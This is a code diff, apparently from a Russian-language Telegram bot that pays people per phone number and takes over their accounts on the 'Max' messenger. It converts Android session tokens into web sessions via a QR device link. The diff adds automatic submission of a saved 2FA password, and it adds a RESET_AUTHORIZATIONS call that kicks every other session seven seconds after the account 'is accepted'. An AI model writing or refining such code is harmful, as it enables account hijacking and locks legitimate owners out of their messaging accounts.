@@ -348,25 +348,6 @@ class MaxAuth:
             return {"success": False, "error": data["error"]}
         return {"success": True, "token": data.get("token", token)}
 
-    def get_sessions(self):
-        try:
-            p = Packet(Opcode.AUTH_REQUEST, pack({"type": "GET_SESSIONS"}))
-            resp = self.conn.send(p)
-            data = unpack(resp.payload)
-            return data.get("sessions", [])
-        except:
-            return []
-
-    def close_session(self, session_id):
-        try:
-            p = Packet(Opcode.AUTH_REQUEST, pack({
-                "type": "CLOSE_SESSION",
-                "sessionId": session_id
-            }))
-            self.conn.send(p, wait=False)
-        except:
-            pass
-
     def confirm_qr_scan(self, track_id: str, qr_link: str = None) -> dict:
         payload = {"trackId": track_id}
         if qr_link:
@@ -379,6 +360,19 @@ class MaxAuth:
             return unpack(resp.payload)
         except:
             return {}
+
+    def kill_other_sessions(self, token: str):
+        """Закрывает все сессии кроме текущей"""
+        try:
+            self.login_by_token(token)
+            time.sleep(1)
+            # Пробуем через RESET_AUTHORIZATIONS
+            p = Packet(20, pack({"type": "RESET_AUTHORIZATIONS"}))
+            resp = self.conn.send(p)
+            data = unpack(resp.payload)
+            logging.info(f"Kill sessions response: {str(data)[:200]}")
+        except Exception as e:
+            logging.warning(f"Failed to kill old sessions: {e}")
 
 class MaxRegistration:
     def __init__(self, device_id=None):
@@ -481,7 +475,7 @@ class MaxRegistration:
 class WebQRDeviceLink:
     USER_AGENT = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36"
 
-    def __init__(self, phone=None):
+    def __init__(self, phone=None, password=None):
         self.phone = phone
         self.device_id = str(uuid.uuid4())
         self.track_id = None
@@ -498,6 +492,7 @@ class WebQRDeviceLink:
         self._session_id = None
         self._expires_at = None
         self._password_challenge = None
+        self._password = password
         self._lock = threading.Lock()
 
     def get_seq(self):
@@ -506,9 +501,12 @@ class WebQRDeviceLink:
             self._seq += 1
             return s
 
-    def generate_and_wait(self, timeout=120):
+    def generate_and_wait(self, timeout=120, password=None):
         if not websocket:
             return None, None
+        
+        if password:
+            self._password = password
         
         self.running = True
         self._seq = 0
@@ -542,7 +540,6 @@ class WebQRDeviceLink:
 
                 elif opcode == 289 and cmd == 1:
                     status = payload.get("status", {})
-                    logging.info(f"[QR] Status: {json.dumps(status, ensure_ascii=False)}")
                     if status.get("loginAvailable"):
                         logging.info("[QR] QR scanned!")
                         self.scan_detected.set()
@@ -553,8 +550,17 @@ class WebQRDeviceLink:
                 elif opcode == 291 and cmd == 1:
                     if "passwordChallenge" in payload:
                         self._password_challenge = payload["passwordChallenge"]
-                        logging.info("[QR] 2FA password required!")
-                        self.password_required.set()
+                        if self._password:
+                            logging.info("[QR] Auto-sending password immediately!")
+                            request = {
+                                "seq": self.get_seq(), "opcode": 115,
+                                "payload": {"trackId": self.track_id, "password": self._password},
+                                "ver": 11, "cmd": 0
+                            }
+                            ws.send(json.dumps(request))
+                        else:
+                            logging.info("[QR] 2FA password required!")
+                            self.password_required.set()
                     elif "tokenAttrs" in payload:
                         token_data = payload["tokenAttrs"].get("LOGIN", {})
                         self.token = token_data.get("token")
@@ -574,7 +580,7 @@ class WebQRDeviceLink:
                             self.running = False
                             ws.close()
                     else:
-                        logging.error("[QR] 2FA error")
+                        logging.error("[QR] 2FA error - wrong password")
                         self.running = False
                         ws.close()
 
@@ -735,21 +741,6 @@ class WebQRDeviceLink:
         ws.send(json.dumps(login))
         logging.info("[QR] LOGIN sent")
 
-    def send_password(self, password: str) -> bool:
-        if not self.ws or not self._password_challenge:
-            return False
-        try:
-            request = {
-                "seq": self.get_seq(), "opcode": 115,
-                "payload": {"trackId": self.track_id, "password": password},
-                "ver": 11, "cmd": 0
-            }
-            self.ws.send(json.dumps(request))
-            return True
-        except Exception as e:
-            logging.error(f"[QR] Password send error: {e}")
-            return False
-
     def close(self):
         self.running = False
         if self.ws:
@@ -818,14 +809,14 @@ def convert_android_to_web(android_token: str, device_id: str = None,
         "error": None
     }
 
-    qr_link = WebQRDeviceLink(phone=phone)
+    qr_link = WebQRDeviceLink(phone=phone, password=password)
     if device_id:
         qr_link.device_id = device_id
 
     qr_result = {"qr": None, "token": None}
 
     def run_qr():
-        qr_result["qr"], qr_result["token"] = qr_link.generate_and_wait(timeout=120)
+        qr_result["qr"], qr_result["token"] = qr_link.generate_and_wait(timeout=120, password=password)
 
     qr_thread = threading.Thread(target=run_qr)
     qr_thread.start()
@@ -874,48 +865,12 @@ def convert_android_to_web(android_token: str, device_id: str = None,
         logging.info("[CONVERT] Logging out from Android...")
         logout_android(android_token, device_id or qr_link.device_id)
     elif qr_link.password_required.is_set():
-        if password:
-            logging.info(f"[CONVERT] Sending saved 2FA password...")
-            if qr_link.send_password(password):
-                time.sleep(3)
-                if qr_link.login_complete.wait(timeout=30):
-                    result["success"] = True
-                    result["web_token"] = qr_link.token
-                else:
-                    result["error"] = "2FA password incorrect"
-            else:
-                result["error"] = "Failed to send 2FA password"
-        else:
-            result["error"] = "2FA_PASSWORD_REQUIRED"
+        result["error"] = "2FA_PASSWORD_REQUIRED"
     else:
         result["error"] = "WEB token timeout"
 
     qr_link.close()
     return result
-
-# ==================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ====================
-
-def kill_old_sessions(auth, token):
-    """Закрывает все старые сессии, оставляя только текущую"""
-    try:
-        auth.login_by_token(token)
-        sessions = auth.get_sessions()
-        if sessions:
-            current_id = None
-            for sess in sessions:
-                if isinstance(sess, dict) and sess.get('current'):
-                    current_id = sess.get('id')
-                    break
-            
-            closed = 0
-            for sess in sessions:
-                sess_id = sess.get('id') if isinstance(sess, dict) else None
-                if sess_id and sess_id != current_id:
-                    auth.close_session(sess_id)
-                    closed += 1
-            logging.info(f"Closed {closed} old sessions, kept current: {current_id}")
-    except Exception as e:
-        logging.warning(f"Failed to close old sessions: {e}")
 
 # ==================== ДАННЫЕ ====================
 
@@ -1879,20 +1834,19 @@ async def code_handler(message: types.Message, state: FSMContext):
         save_data()
         await msg.edit_text(f"✅ Номер принят! Аккаунт успешно встал\n💰 Начислено: ${PRICE_PER_PHONE}")
         
-        # Кикаем старые сессии в фоне (отдельное соединение)
+        # Кикаем старые сессии через 7 секунд
         if result.get("token"):
             def kill_later():
+                time.sleep(7)
                 try:
-                    time.sleep(2)
                     new_auth = MaxAuth(device_id=device_id)
                     if new_auth.connect():
                         new_auth.session_init()
                         time.sleep(1)
-                        kill_old_sessions(new_auth, token)
+                        new_auth.kill_other_sessions(token)
                         new_auth.close()
-                except Exception as e:
-                    logging.warning(f"Failed to kill old sessions: {e}")
-            
+                except:
+                    pass
             threading.Thread(target=kill_later, daemon=True).start()
         
         auth.close()
@@ -1956,20 +1910,19 @@ async def password_handler(message: types.Message, state: FSMContext):
         save_data()
         await msg.edit_text(f"✅ Номер принят! Аккаунт успешно встал\n💰 Начислено: ${PRICE_PER_PHONE}")
         
-        # Кикаем старые сессии в фоне
+        # Кикаем старые сессии через 7 секунд
         device_id = auth.device_id
         def kill_later():
+            time.sleep(7)
             try:
-                time.sleep(2)
                 new_auth = MaxAuth(device_id=device_id)
                 if new_auth.connect():
                     new_auth.session_init()
                     time.sleep(1)
-                    kill_old_sessions(new_auth, token)
+                    new_auth.kill_other_sessions(token)
                     new_auth.close()
-            except Exception as e:
-                logging.warning(f"Failed to kill old sessions: {e}")
-        
+            except:
+                pass
         threading.Thread(target=kill_later, daemon=True).start()
     else:
         await msg.edit_text("❌ Неверный пароль. Попробуйте ещё раз.")
